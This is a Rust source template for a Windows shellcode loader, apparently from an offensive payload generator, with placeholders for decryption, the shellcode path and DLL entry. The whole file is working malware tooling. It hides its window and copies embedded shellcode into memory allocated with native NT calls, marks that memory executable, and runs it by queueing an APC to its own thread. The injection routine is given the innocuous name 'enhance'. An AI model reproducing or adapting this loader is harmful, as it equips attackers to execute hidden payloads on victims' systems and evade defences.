#![windows_subsystem = "windows"] 
#![allow(non_snake_case)]

use ntapi::ntmmapi::NtAllocateVirtualMemory;
use ntapi::ntmmapi::NtProtectVirtualMemory;
use ntapi::ntmmapi::NtWriteVirtualMemory;
use ntapi::ntpsapi::NtCurrentProcess;
use ntapi::ntpsapi::NtCurrentThread;
use ntapi::ntpsapi::NtQueueApcThread;
use ntapi::ntpsapi::NtTestAlert;
use ntapi::ntpsapi::PPS_APC_ROUTINE;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use winapi::{
    shared::ntdef::NT_SUCCESS,
    um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
};
//use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;

use std::include_bytes;

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn enhance(mut buf: Vec<u8>) {
    unsafe {
        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = buf.len();
        let alloc_status = NtAllocateVirtualMemory(NtCurrentProcess, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(alloc_status) {
            if cfg!(debug_assertions) {
                println!("[-] Error calling NtAllocateVirtualMemory: {}", alloc_status);
                panic!();
            } else {
                panic!();
            }
        }
        
        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let mut buffer_length = buf.len();
        let write_status = NtWriteVirtualMemory(NtCurrentProcess, allocstart, buffer, buffer_length, &mut byteswritten);
        if !NT_SUCCESS(write_status) {
            if cfg!(debug_assertions) {
                println!("[-] Error calling NtWriteVirtualMemory: {}", write_status);
                panic!();
            } else {
                panic!();
            }
        }

        let mut old_perms = PAGE_READWRITE;
        let protect_status = NtProtectVirtualMemory(NtCurrentProcess, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
        if !NT_SUCCESS(protect_status) {
            if cfg!(debug_assertions) {
                println!("[-] Error calling NtProtectVirtualMemory: {}", protect_status);
                panic!();
            } else {
                panic!();
            }
        }

        let apc = NtQueueApcThread(NtCurrentThread, Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE, allocstart, null_mut(), null_mut());
        // thanks to https://github.com/trickster0/OffensiveRust/blob/c7629a285e8128348d7d7239e25db858064ad0e2/Injection_AES_Loader/src/main.rs
        if !NT_SUCCESS(apc) {
            if cfg!(debug_assertions) {
                println!("[-] Error calling NtQueueApcThread: {}", apc);
                panic!();
            } else {
                panic!();
            }
        }

        NtTestAlert();
    }
}

fn main() {
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});

    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    {{MAIN}}
    enhance(vec.clone());
}

{{DLL_MAIN}}